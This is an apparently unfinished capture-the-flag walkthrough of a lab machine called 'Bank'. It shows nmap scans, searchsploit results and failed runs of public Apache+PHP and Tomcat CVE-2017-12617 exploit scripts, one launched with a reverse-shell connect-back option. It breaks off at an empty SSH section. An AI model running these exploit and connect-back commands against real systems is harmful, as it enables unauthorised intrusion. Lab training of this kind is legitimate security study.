# References
1. [Bank Writeup (x.com)]()
2. [Bank Writeup (x.com)]()

# Summary
### 1. NMAP

### 2. Enumeration

### 3. Attacking Port 80 Apache 2.4.7

### 4. Attacking Port 22 OpenSSH 6.6.1p1

# Attack
## 1. NMAP
This machine sounds fun. Let's go.
```
hippoeug@kali:~$ nmap -sC -sV 10.10.10.29 -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-26 22:42 +08
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain?
80/tcp open  http    Apache/2.4.7 (Ubuntu)
|_http-server-header: Apache/2.4.7 (Ubuntu)                                                                                                                           
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```
Ooh, a Linux machine. SSH, mystery port, and HTTP!

Let's do the obligatory vuln script too.
```
hippoeug@kali:~$ nmap --script vuln 10.10.10.29 -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-26 22:44 +08
...
PORT   STATE SERVICE
22/tcp open  ssh
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
53/tcp open  domain
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp open  http
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack                                                                                                                                              
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
...
```

## 2. Enumeration
Let's visit the webpage. Navigating to `http://10.10.10.29:80` on our browser, we see the Apache2 Ubuntu Default Page.

We can do Dirbuster if we do not find anything else. Time to find exploits!

Let's see `apache 2.4.7` first.
```
hippoeug@kali:~$ searchsploit apache 2.4.7
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                                                     | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                                                   | php/remote/29316.py
Apache 2.4.7 + PHP 7.0.2 - 'openssl_seal()' Uninitialized Memory Code Execution                                                     | php/remote/40142.php
Apache 2.4.7 mod_status - Scoreboard Handling Race Condition                                                                        | linux/dos/34133.txt
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak                                                                                    | linux/webapps/42745.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                                                                 | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                          | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                          | unix/remote/47080.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal                                                                 | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                                                                                   | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                                                                 | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                                                                           | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                        | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                        | jsp/webapps/42966.py
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                                                                        | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution                                                    | linux/remote/34.pl
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Many exploits, let's KIV and try some.

While we're at it, let's look at `openssh 6.6.1` as well.
```
hippoeug@kali:~$ searchsploit openssh 6.6.1
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                            | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                      | linux/remote/45210.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                                | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                            | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                                | linux/remote/45939.py
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

hippoeug@kali:~$ searchsploit 2ubuntu
Exploits: No Results
Shellcodes: No Results
```
Interesting, couple exploits to KIV too.

## 3. Attacking Port 80 Apache 2.4.7
Googling for "apache 2.4.7 exploit", we don't see anything obvious that we could try. This is unusual, when compared to the previous exercises we have done so far.

Regardless, we will try a few from the Searchsploit searches. Let's try the `Remote Code Execution + Scanner` for `Apache + PHP`, even though we may not have PHP.
```
hippoeug@kali:~$ searchsploit -m 29316.py
  Exploit: Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner
      URL: https://www.exploit-db.com/exploits/29316
     Path: /usr/share/exploitdb/exploits/php/remote/29316.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/hippoeug/29316.py

hippoeug@kali:~$ python 29316.py
--==[ ap-unlock-v1337.py by noptrix@nullsecurity.net ]==--
usage: 

  ./ap-unlock-v1337.py -h <4rg> -s | -c <4rg> | -x <4rg> [0pt1ons]
  ./ap-unlock-v1337.py -r <4rg> | -R <4rg> | -i <4rg> [0pt1ons]

0pt1ons:

  -h wh1t3h4tz.0rg     | t3st s1ngle h0st f0r vu1n
  -p 80                | t4rg3t p0rt (d3fau1t: 80)
  -S                   | c0nn3ct thr0ugh ss1
  -c 'uname -a;id'     | s3nd c0mm4nds t0 h0st
  -x 192.168.0.2:1337  | c0nn3ct b4ck h0st 4nd p0rt f0r sh3ll
  -s                   | t3st s1ngl3 h0st f0r vu1n
  -r 133.1.3-7.7-37    | sc4nz iP addr3ss r4ng3 f0r vu1n
  -R 1337              | sc4nz num r4nd0m h0st5 f0r vu1n
  -t 2                 | c0nn3ct t1me0ut in s3x (d3fau1t: 3)
  -T 2                 | r3ad t1me0ut in s3x (d3fau1t: 3)
  -f vu1n.lst          | wr1t3 vu1n h0sts t0 f1l3
  -i sc4nz.lst         | sc4nz h0sts fr0m f1le f0r vu1n
  -v                   | pr1nt m0ah 1nf0z wh1l3 sh1tt1ng
hippoeug@kali:~$ python 29316.py -h 10.129.29.200 -s -x 10.10.x.x:4444
--==[ ap-unlock-v1337.py by noptrix@nullsecurity.net ]==--
[+] sc4nn1ng s1ngl3 h0st 10.129.29.200 
[+] h0p3 1t h3lp3d
```
This weird thing didn't h3lp3d at all, was d1ss4p01n+ing..

Let's give another one a shot, this time `JSP Upload Bypass / Remote Code Execution (2)` for `Apache Tomcat`, even though we may not have Tomcat.
```
hippoeug@kali:~$ searchsploit -m 42966.py
  Exploit: Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)
      URL: https://www.exploit-db.com/exploits/42966
     Path: /usr/share/exploitdb/exploits/jsp/webapps/42966.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/hippoeug/42966.py

hippoeug@kali:~$ python 42966.py

                                                                                                                                                                      
                                                                                                                                                                      
   _______      ________    ___   ___  __ ______     __ ___   __ __ ______                                                                                            
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |                                                                                           
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /                                                                                            
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /                                                                                             
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /                                                                                              
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/                                                                                               
                                                                                                                                                                      
                                                                                                                                                                      
                                                                                                                                                                      
                                                                                                                                                                      
./cve-2017-12617.py [options]                                                                                                                                         
                                                                                                                                                                      
options:                                                                                                                                                              
                                                                                                                                                                      
-u ,--url [::] check target url if it's vulnerable                                                                                                                    
-p,--pwn  [::] generate webshell and upload it                                                                                                                        
-l,--list [::] hosts list                                                                                                                                             
                                                                                                                                                                      
[+]usage:                                                                                                                                                             
                                                                                                                                                                      
./cve-2017-12617.py -u http://127.0.0.1                                                                                                                               
./cve-2017-12617.py --url http://127.0.0.1                                                                                                                            
./cve-2017-12617.py -u http://127.0.0.1 -p pwn                                                                                                                        
./cve-2017-12617.py --url http://127.0.0.1 -pwn pwn                                                                                                                   
./cve-2017-12617.py -l hotsts.txt                                                                                                                                     
./cve-2017-12617.py --list hosts.txt                                                                                                                                  
                                                                                                                                                                      
                                                                                                                                                                      
[@intx0x80]

hippoeug@kali:~$ python 42966.py -u http://10.129.29.200

                                                                                                                                                                      
                                                                                                                                                                      
   _______      ________    ___   ___  __ ______     __ ___   __ __ ______                                                                                            
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |                                                                                           
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /                                                                                            
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /                                                                                             
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /                                                                                              
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/                                                                                               
                                                                                                                                                                      
                                                                                                                                                                      
                                                                                                                                                                      
[@intx0x80]                                                                                                                                                           
                                                                                                                                                                      
                                                                                                                                                                      
Poc Filename  Poc.jsp
Not Vulnerable to CVE-2017-12617 
```
Nope, not vulnerable. Let's move on to find another way in.

## 4. Attacking Port 22 OpenSSH 6.6.1p1
